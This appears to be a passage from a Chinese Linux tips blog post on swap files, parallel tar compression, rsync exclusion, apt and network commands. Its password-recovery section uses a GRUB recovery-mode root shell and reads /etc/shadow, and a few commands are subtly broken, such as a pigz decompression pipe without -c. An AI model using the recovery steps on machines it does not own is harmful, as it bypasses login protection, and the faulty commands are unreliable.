            <a href="/2024/05/22/notebook/Linux/linux_3_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-linux_3_02_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">linux_3_02_常用技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>linux系统下常用技巧</li>
</ul>
<h2 id="linux-交换空间配置"><a href="#linux-交换空间配置" class="headerlink" title="linux 交换空间配置"></a>linux 交换空间配置</h2><p>在 Linux 系统中创建交换分区可以通过以下步骤完成：</p>
<ol>
<li><p><strong>检查当前交换空间</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> swapon --show</span><br><span class="line">free -h</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>创建一个新的交换文件或交换分区</strong>：</p>
<ul>
<li><p><strong>创建交换文件</strong>：</p>
<ol>
<li>创建交换文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> fallocate -l 2G /swapfile</span><br></pre></td></tr></table></figure>
如果 <code>fallocate</code> 不可用，可以使用 <code>dd</code>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=/swapfile bs=1M count=2048</span><br></pre></td></tr></table></figure></li>
<li>设置正确的权限：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 600 /swapfile</span><br></pre></td></tr></table></figure></li>
<li>将文件格式化为交换空间：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mkswap /swapfile</span><br></pre></td></tr></table></figure></li>
<li>启用交换文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> swapon /swapfile</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><strong>创建交换分区</strong>：</p>
<ol>
<li>使用 <code>fdisk</code> 或其他分区工具创建一个新的分区，类型为 <code>82</code> (Linux swap)：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> fdisk /dev/sdX</span><br></pre></td></tr></table></figure></li>
<li>格式化新的分区为交换空间：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mkswap /dev/sdXn</span><br></pre></td></tr></table></figure></li>
<li>启用交换分区：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> swapon /dev/sdXn</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
</li>
<li><p><strong>更新 <code>/etc/fstab</code> 以使交换空间在系统启动时自动挂载</strong>：</p>
<ul>
<li>如果使用交换文件，添加以下行到 <code>/etc/fstab</code>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/swapfile none swap sw 0 0</span><br></pre></td></tr></table></figure></li>
<li>如果使用交换分区，添加以下行到 <code>/etc/fstab</code>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dev/sdXn none swap sw 0 0</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>验证交换空间</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> swapon --show</span><br><span class="line">free -h</span><br></pre></td></tr></table></figure></li>
</ol>
<p>通过以上步骤，你可以在 Linux 系统中成功创建和启用交换空间。</p>
<h2 id="linux-tar命令-多线程压缩"><a href="#linux-tar命令-多线程压缩" class="headerlink" title="linux tar命令 多线程压缩"></a>linux tar命令 多线程压缩</h2><p>在Linux系统中，<code>tar</code>命令用于创建归档文件，通常与<code>gzip</code>、<code>bzip2</code>等压缩工具结合使用。默认情况下，<code>tar</code>命令不支持多线程压缩，但你可以通过使用多线程压缩工具来实现这个功能。下面是几种方法：</p>
<h3 id="方法一：使用-pigz-parallel-implementation-of-gzip"><a href="#方法一：使用-pigz-parallel-implementation-of-gzip" class="headerlink" title="方法一：使用 pigz (parallel implementation of gzip)"></a>方法一：使用 <code>pigz</code> (parallel implementation of gzip)</h3><p><code>pigz</code> 是 <code>gzip</code> 的多线程版本，可以直接替代 <code>gzip</code> 使用。</p>
<ol>
<li><p>安装 <code>pigz</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install pigz    <span class="comment"># Ubuntu/Debian</span></span><br><span class="line"><span class="built_in">sudo</span> yum install pigz        <span class="comment"># CentOS/RHEL</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 <code>tar</code> 和 <code>pigz</code> 进行多线程压缩：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf - /path/to/directory | pigz -p 8 &gt; archive.tar.gz</span><br></pre></td></tr></table></figure>

<p>其中 <code>-p 8</code> 指定了使用 8 个线程，可以根据你的 CPU 核心数进行调整。</p>
</li>
</ol>
<h3 id="方法二：使用-pxz-parallel-xz"><a href="#方法二：使用-pxz-parallel-xz" class="headerlink" title="方法二：使用 pxz (parallel xz)"></a>方法二：使用 <code>pxz</code> (parallel xz)</h3><p><code>pxz</code> 是 <code>xz</code> 的多线程版本。</p>
<ol>
<li><p>安装 <code>pxz</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install pxz    <span class="comment"># Ubuntu/Debian</span></span><br><span class="line"><span class="built_in">sudo</span> yum install pxz        <span class="comment"># CentOS/RHEL</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 <code>tar</code> 和 <code>pxz</code> 进行多线程压缩：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf - /path/to/directory | pxz -T8 &gt; archive.tar.xz</span><br></pre></td></tr></table></figure>

<p>其中 <code>-T8</code> 指定了使用 8 个线程。</p>
</li>
</ol>
<h3 id="方法三：使用-pbzip2-parallel-bzip2"><a href="#方法三：使用-pbzip2-parallel-bzip2" class="headerlink" title="方法三：使用 pbzip2 (parallel bzip2)"></a>方法三：使用 <code>pbzip2</code> (parallel bzip2)</h3><p><code>pbzip2</code> 是 <code>bzip2</code> 的多线程版本。</p>
<ol>
<li><p>安装 <code>pbzip2</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install pbzip2    <span class="comment"># Ubuntu/Debian</span></span><br><span class="line"><span class="built_in">sudo</span> yum install pbzip2        <span class="comment"># CentOS/RHEL</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 <code>tar</code> 和 <code>pbzip2</code> 进行多线程压缩：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf - /path/to/directory | pbzip2 -p8 &gt; archive.tar.bz2</span><br></pre></td></tr></table></figure>

<p>其中 <code>-p8</code> 指定了使用 8 个线程。</p>
</li>
</ol>
<h3 id="示例总结"><a href="#示例总结" class="headerlink" title="示例总结"></a>示例总结</h3><p>例如，要使用 <code>pigz</code> 进行多线程压缩 <code>/home/user/data</code> 目录，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf - /home/user/data | pigz -p 8 &gt; data.tar.gz</span><br></pre></td></tr></table></figure>

<p>解压缩命令相应地调整为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pigz -d -p 8 data.tar.gz | tar -xf -</span><br></pre></td></tr></table></figure>

<p>以上这些方法都可以显著加快压缩过程，特别是在处理大型文件或目录时，选择合适的线程数可以充分利用多核 CPU 的性能。</p>
<h2 id="linux-scp-忽略指定目录"><a href="#linux-scp-忽略指定目录" class="headerlink" title="linux scp 忽略指定目录"></a>linux scp 忽略指定目录</h2><p>在 Linux 上使用 <code>scp</code>（Secure Copy）命令时，如果你想要忽略特定目录，可以使用 <code>rsync</code> 命令的 <code>--exclude</code> 选项，因为 <code>scp</code> 本身并没有直接提供忽略特定目录的功能。<code>rsync</code> 是一个功能更强大的工具，可以在网络上同步文件和目录。</p>
<p>以下是如何使用 <code>rsync</code> 忽略特定目录的示例：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz --exclude <span class="string">&#x27;忽略的目录&#x27;</span> 源路径 用户名@远程主机:目标路径</span><br></pre></td></tr></table></figure>

<p>这里是具体步骤：</p>
<ol>
<li>**<code>-a</code>**：归档模式，表示递归复制文件，并保持文件的属性。</li>
<li>**<code>-v</code>**：详细模式，显示过程信息。</li>
<li>**<code>-z</code>**：压缩传输文件以节省带宽。</li>
<li>**<code>--exclude</code>**：指定要忽略的目录或文件。</li>
</ol>
<p>假设你想要将本地的 <code>/home/user/data</code> 目录复制到远程主机 <code>remote_host</code> 的 <code>/backup</code> 目录，但要忽略 <code>data/ignore_this_dir</code> 目录，可以使用以下命令：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz --exclude <span class="string">&#x27;ignore_this_dir&#x27;</span> /home/user/data user@remote_host:/backup</span><br></pre></td></tr></table></figure>

<p>如果你必须使用 <code>scp</code>，可以考虑以下变通方法：</p>
<ol>
<li><strong>创建一个临时副本</strong>：在本地创建一个源目录的临时副本，并删除要忽略的目录。</li>
<li><strong>使用 <code>scp</code> 复制临时副本</strong>：将临时副本复制到远程主机。</li>
<li><strong>删除临时副本</strong>：删除本地的临时副本。</li>
</ol>
<p>例如：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建临时副本</span></span><br><span class="line"><span class="built_in">cp</span> -r /home/user/data /home/user/data_temp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除要忽略的目录</span></span><br><span class="line"><span class="built_in">rm</span> -rf /home/user/data_temp/ignore_this_dir</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 scp 复制临时副本</span></span><br><span class="line">scp -r /home/user/data_temp user@remote_host:/backup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除本地的临时副本</span></span><br><span class="line"><span class="built_in">rm</span> -rf /home/user/data_temp</span><br></pre></td></tr></table></figure>

<p>这种方法虽然有点笨拙，但可以在没有 <code>rsync</code> 时实现类似的功能。推荐使用 <code>rsync</code>，因为它更高效且功能强大。</p>
<h2 id="禁用内核升级"><a href="#禁用内核升级" class="headerlink" title="禁用内核升级"></a>禁用内核升级</h2><ul>
<li><p>查看可用内核</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dpkg --list | grep linux-image</span><br><span class="line">dpkg --list | grep linux-headers</span><br><span class="line">dpkg --list | grep linux-modules</span><br></pre></td></tr></table></figure>
</li>
<li><p>锁定内核更新</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-mark hold linux-image-5.15.0-92generic</span><br><span class="line"><span class="built_in">sudo</span> apt-mark hold linux-headers-5.15.0-92-generic</span><br><span class="line"><span class="built_in">sudo</span> apt-mark hold linux-modules-extra-5.15.0-92-generic</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="apt-search"><a href="#apt-search" class="headerlink" title="apt search"></a>apt search</h2><ul>
<li><p>apt search命令在包的名称和描述中查找提供的字符串</p>
<ul>
<li>apt search package_name</li>
</ul>
</li>
<li><p>apt show命令提供有关软件包的详细信息</p>
<ul>
<li>apt show package_name</li>
</ul>
</li>
<li><p>apt包管理器在本地数据库&#x2F;缓存中工作,其中包含来自各个存储库的可用包.该数据库包含有关可用包版本,依赖项等信息.他不包含整个包本身.这些软件包是从远程存储库下载的.</p>
</li>
<li><p>当运行sudo apt update命令时,会在 &#x2F;var&#x2F;lib&#x2F;apt&#x2F;list目录中创建&#x2F;更新此缓存.apt search和apt show命令利用此缓存</p>
</li>
<li><p>术语包用于应用程序,程序,软件</p>
</li>
<li><p>当搜索 apt search gambas时,将提供名称或者描述中包含 gambas 的大量软件包列表.此输出列表按照字母顺序排序</p>
</li>
<li><p>为什么会有很多与gambas相关的软件包?</p>
<ul>
<li>因为许多gambas软件包可能是依赖项,如果安装gambas3软件包,他们会自动安装.</li>
<li>如果使用apt show gambas3命令,他将显示与gambas3软件包一起安装的所有依赖项</li>
</ul>
</li>
<li><p>默认情况下,apt search命令会在包名称及其描述中查找搜索项</p>
</li>
<li><p>可以通过指示apt命令仅搜索包名称来缩小搜索范围</p>
<ul>
<li>apt search –names-only search_term</li>
</ul>
</li>
</ul>
<h2 id="apt-show"><a href="#apt-show" class="headerlink" title="apt show"></a>apt show</h2><ul>
<li>apt show命令适用于确切的包名称,他提供有关包的更多信息:<ul>
<li>版本信息</li>
<li>存储库信息</li>
<li>包信息的来源和维护者</li>
<li>在那里提交错误</li>
<li>下载以及安装大小</li>
<li>依赖关系</li>
<li>包的详细说明</li>
<li>等等</li>
</ul>
</li>
</ul>
<h2 id="ubuntu-apt-升级指定软件包"><a href="#ubuntu-apt-升级指定软件包" class="headerlink" title="ubuntu apt 升级指定软件包"></a>ubuntu apt 升级指定软件包</h2><p>在Ubuntu上使用<code>apt</code>来升级指定的软件包的步骤如下：</p>
<h3 id="步骤计划"><a href="#步骤计划" class="headerlink" title="步骤计划"></a>步骤计划</h3><ol>
<li><strong>更新软件包列表</strong>：刷新可用软件包及其版本的列表。</li>
<li><strong>升级指定软件包</strong>：使用<code>apt install</code>命令和<code>--only-upgrade</code>标志。</li>
<li><strong>验证升级</strong>：检查软件包的版本以确保其已升级。</li>
</ol>
<h3 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h3><ol>
<li><p><strong>更新软件包列表</strong>：</p>
<p> 确保你有关于可用软件包的最新信息：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>升级指定软件包</strong>：</p>
<p> 使用<code>apt install</code>命令和<code>--only-upgrade</code>标志来升级指定的软件包。将<code>package_name</code>替换为你要升级的软件包名称：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install --only-upgrade package_name</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>验证升级</strong>：</p>
<p> 检查软件包的版本以确认其已升级。验证方法取决于软件包。对于大多数软件包，你可以使用以下命令：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">package_name --version</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>例如，要升级<code>curl</code>软件包，你可以按照以下步骤进行：</p>
<ol>
<li><p><strong>更新软件包列表</strong>：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>升级<code>curl</code>软件包</strong>：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install --only-upgrade curl</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>验证升级</strong>：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --version</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h3><p>以下是更新软件包列表并升级<code>curl</code>软件包的完整脚本：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新软件包列表</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级指定软件包（此例中为curl）</span></span><br><span class="line"><span class="built_in">sudo</span> apt install --only-upgrade curl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证升级</span></span><br><span class="line">curl --version</span><br></pre></td></tr></table></figure>

<p>将此脚本保存为一个文件，例如<code>upgrade_package.sh</code>，使其可执行，然后运行它：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x upgrade_package.sh</span><br><span class="line">./upgrade_package.sh</span><br></pre></td></tr></table></figure>

<p>此脚本将升级你在Ubuntu系统上指定的软件包。</p>
<h3 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h3><p><strong>a.</strong> 识别任何其他需要升级的软件包，并使用相同的方法。</p>
<p><strong>b.</strong> 设置一个cron作业，定期检查并应用关键软件包的升级。</p>
<h2 id="linux-检查网络的命令-详解"><a href="#linux-检查网络的命令-详解" class="headerlink" title="linux 检查网络的命令 详解"></a>linux 检查网络的命令 详解</h2><p>在 Linux 中，有多种命令可以用于检查网络连接、配置和状态。以下是一些常用的命令及其用法：</p>
<ol>
<li><p><strong>ping</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping &lt;目标主机或 IP 地址&gt;</span><br></pre></td></tr></table></figure>
<p><code>ping</code> 命令用于测试本地主机与目标主机之间的连接是否正常。它发送 ICMP 回显请求报文，并等待目标主机回复。如果目标主机正常响应，表示网络连接正常。</p>
</li>
<li><p><strong>ifconfig 或 ip addr</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure>
<p><code>ifconfig</code> 或 <code>ip addr</code> 命令用于显示当前系统的网络接口信息，包括 IP 地址、MAC 地址、网络接口状态等。</p>
</li>
<li><p><strong>netstat 或 ss</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tuln</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tuln</span><br></pre></td></tr></table></figure>
<p><code>netstat</code> 或 <code>ss</code> 命令用于显示当前系统的网络连接状态和监听的端口。以上命令显示当前所有的 TCP 和 UDP 连接。</p>
</li>
<li><p><strong>traceroute</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute &lt;目标主机&gt;</span><br></pre></td></tr></table></figure>
<p><code>traceroute</code> 命令用于追踪数据包从本地主机到目标主机的路径，显示经过的每个路由器的 IP 地址和到达目标主机的时间。</p>
</li>
<li><p><strong>nslookup 或 dig</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup &lt;域名&gt;</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig &lt;域名&gt;</span><br></pre></td></tr></table></figure>
<p><code>nslookup</code> 或 <code>dig</code> 命令用于查询域名的 DNS 解析信息，包括域名对应的 IP 地址等。</p>
</li>
<li><p><strong>route 或 ip route</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route -n</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route</span><br></pre></td></tr></table></figure>
<p><code>route</code> 或 <code>ip route</code> 命令用于显示当前系统的路由表，包括默认网关等路由信息。</p>
</li>
</ol>
<p>以上是一些常用的网络检查命令及其用法，可以帮助你在 Linux 系统中诊断和解决网络问题。</p>
<h2 id="ip配置"><a href="#ip配置" class="headerlink" title="ip配置"></a>ip配置</h2><ul>
<li>临时更改:<code>sudo ifconfig ip-address netmask mask</code>, 例如:<code>sudo ifconfig 192.167.0.92 netmask 255.255.0.0</code></li>
<li>永久更改:修改<code>/etc/network/interface</code>文件</li>
</ul>
<h2 id="linux-vim命令-复制文件中指定字符串并进行搜索"><a href="#linux-vim命令-复制文件中指定字符串并进行搜索" class="headerlink" title="linux vim命令 复制文件中指定字符串并进行搜索"></a>linux vim命令 复制文件中指定字符串并进行搜索</h2><p>如果你想在一个文件中找到指定的字符串，并将该字符串复制到寄存器中以供后续搜索或操作，你可以使用以下步骤：</p>
<h3 id="1-寻找并复制字符串："><a href="#1-寻找并复制字符串：" class="headerlink" title="1. 寻找并复制字符串："></a>1. 寻找并复制字符串：</h3><ol>
<li><p>打开文件，进入正常模式。</p>
</li>
<li><p>使用 <code>/</code> 进行正向搜索，找到目标字符串。</p>
</li>
<li><p>在找到字符串后，可以使用 <code>yiw</code> 命令将光标下的单词复制到寄存器中。其中，<code>yi</code> 是 “yank in” 的缩写，<code>w</code> 表示单词。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/target_string</span><br><span class="line">yiw</span><br></pre></td></tr></table></figure>

<p>这将把光标所在的单词复制到寄存器。</p>
</li>
</ol>
<h3 id="2-使用寄存器进行搜索："><a href="#2-使用寄存器进行搜索：" class="headerlink" title="2. 使用寄存器进行搜索："></a>2. 使用寄存器进行搜索：</h3><ol>
<li><p>粘贴刚刚复制的字符串到搜索命令中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&lt;Ctrl + r&gt;0</span><br></pre></td></tr></table></figure>

<p>这里 <code>&lt;Ctrl + r&gt;0</code> 表示将寄存器 <code>0</code> 中的内容粘贴到搜索命令中。<code>0</code> 是寄存器的编号，你可以根据需要使用不同的寄存器。</p>
</li>
<li><p>按 <code>Enter</code> 执行搜索。</p>
</li>
</ol>
<p>这样，你就可以在文件中使用复制的字符串进行进一步的搜索操作。这种方法可以用于在文件中查找与特定字符串相关的其他内容。</p>
<h2 id="linux-查看文件开始n行数据"><a href="#linux-查看文件开始n行数据" class="headerlink" title="linux 查看文件开始n行数据"></a>linux 查看文件开始n行数据</h2><p>在Linux中，你可以使用<code>head</code>命令来查看文件的前几行数据。以下是一些使用<code>head</code>命令的示例：</p>
<ol>
<li><p>查看文件的前n行（默认为前10行）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head filename</span><br></pre></td></tr></table></figure>

<p>例如，查看文件 “example.txt” 的前10行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head example.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看文件的前n行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -n 20 filename</span><br></pre></td></tr></table></figure>

<p>这将显示文件 “filename” 的前20行。你可以将数字20替换为你想要查看的行数。</p>
</li>
<li><p>查看多个文件的前n行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -n 15 file1.txt file2.txt</span><br></pre></td></tr></table></figure>

<p>这将显示 “file1.txt” 和 “file2.txt” 的前15行。</p>
</li>
</ol>
<p>请注意，<code>head</code>命令默认显示前10行，但你可以使用<code>-n</code>选项来指定要显示的行数。如果你想查看文件的末尾行，请使用<code>tail</code>命令。</p>
<h2 id="linux-忘记密码"><a href="#linux-忘记密码" class="headerlink" title="linux 忘记密码"></a>linux 忘记密码</h2><ul>
<li><p>重启系统，全程按着shift键，直到出现 GNU GRUB 界面，并且选择 Advanced options for ubuntu</p>
</li>
<li><p>选择 recovery mode (可能有两个，选择最新的，即上面出现的)</p>
</li>
<li><p>选择root，根据提示获取root权限后，输入 cat &#x2F;etc&#x2F;shadow 查看用户名</p>
</li>
<li><p>输入 passwd username 修改密码</p>
</li>
<li><p>重启登陆即可</p>
</li>
</ul>
<h2 id="如何查看可执行程序和动态库文件的架构和平台信息以及如何根据信息区分程序对应的架构和适用的平台"><a href="#如何查看可执行程序和动态库文件的架构和平台信息以及如何根据信息区分程序对应的架构和适用的平台" class="headerlink" title="如何查看可执行程序和动态库文件的架构和平台信息以及如何根据信息区分程序对应的架构和适用的平台"></a>如何查看可执行程序和动态库文件的架构和平台信息以及如何根据信息区分程序对应的架构和适用的平台</h2><ul>
<li><p>在软件开发和系统调试过程中，了解可执行程序和动态库文件的架构和平台信息是非常重要的。通过查看这些信息，我们可以确定文件所适用的操作系统和硬件平台，并根据架构信息选择合适的编译工具和库文件。本文将详细介绍如何查看可执行程序和动态库文件的架构和平台信息，并提供一些方法来区分程序对应的架构和适用的平台。</p>
</li>
<li><p>架构和平台信息简介</p>
<ul>
<li>架构信息描述计算机系统的硬件特征，包括处理器的位数、字节序和指令集类型等。平台信息指明文件所适用的操作系统和硬件平台。了解文件的架构和平台信息对于选择合适的编译工具、库文件和运行环境非常关键。</li>
</ul>
</li>
<li><p>查看可执行程序架构和平台信息的方法</p>
<ul>
<li>file 命令<ul>
<li>file 是一个常用的命令行工具，可用于检测文件类型和属性。通过 file 命令可以查看可执行程序的架构和平台信息。</li>
<li>使用方法：在终端中执行以下命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ file /path/to/executable</span><br></pre></td></tr></table></figure></li>
<li>返回结果中的描述部分通常会包含架构和平台信息。</li>
</ul>
</li>
<li>readelf 命令<ul>
<li>readelf 是一个强大的命令行工具，用于查看可执行程序和目标文件的信息，包括架构和平台信息。</li>
<li>使用方法：在终端中执行以下命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -h /path/to/executable</span><br></pre></td></tr></table></figure></li>
<li>返回结果中的 “Class” 字段表示架构信息，“OS&#x2F;ABI” 字段表示平台信息。</li>
</ul>
</li>
<li>ldd 命令<ul>
<li>ldd 是一个用于打印可执行程序或动态库文件所依赖的共享库的命令行工具。通过 ldd 命令也可以查看可执行程序的架构和平台信息</li>
